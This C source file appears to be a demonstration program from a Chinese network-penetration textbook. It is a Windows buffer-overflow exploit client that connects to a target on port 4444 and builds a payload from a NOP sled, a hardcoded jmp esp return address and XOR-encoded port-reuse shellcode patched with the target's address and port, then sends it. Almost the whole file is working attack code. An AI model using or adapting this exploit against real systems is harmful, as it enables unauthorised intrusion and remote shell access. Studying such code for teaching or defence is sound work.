/* client_port_reuse.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  端口复用的shellcode演示
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment (lib,"ws2_32")

#include "shellcode_port_reuse.c"

// jmp esp address of chinese version
#define JUMPESP "\x12\x45\xfa\x7f"

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    SOCKET s;
    int i;
    DWORD bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctlsocket(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        closesocket(s);
        return -3;
    }
    if(i==0)
    {
        closesocket(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        closesocket(s);
        return -5;
    }
    ioctlsocket(s,FIONBIO,&bf);
    return s;
}

int main(int argc, char *argv[])
{
    unsigned char  Buff[1024];
    unsigned int bindaddr;
    unsigned short bindport;

    SOCKET  c,s;
    WSADATA WSAData;

    if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
    {
        printf("[-] WSAStartup failed.\n");
        WSACleanup();
        exit(1);
    }

    s = Make_Connection(argv[1], 4444, 10);
    if(s<0)
    {
        printf("[-] connect err.\n");
        exit(1);
    }

    GetShellCode();

    //PrintSc(sh_Buff, sh_Len);

    Enc_key += Enc_key << 8;
    bindport = 4444;
    bindport^= Enc_key;
    bindaddr = inet_addr(argv[1]);
    Enc_key += Enc_key << 16;
    bindaddr^= Enc_key;
    memcpy(&sh_Buff[sh_Len-8], &bindaddr, 4);
    memcpy(&sh_Buff[sh_Len-4], &bindport, 2);

    //
    // 构造攻击Buff
    //
    memset(Buff, 0x90, sizeof(Buff)-1);

    strcpy(Buff+56, JUMPESP);
    strcpy(Buff+60, (unsigned char *)sh_Buff);

    send(s,Buff,sizeof(Buff),0);
    Sleep(1000);

    // 用同一socket进行交互
    //shell(s);

    WSACleanup();
    return 1;
}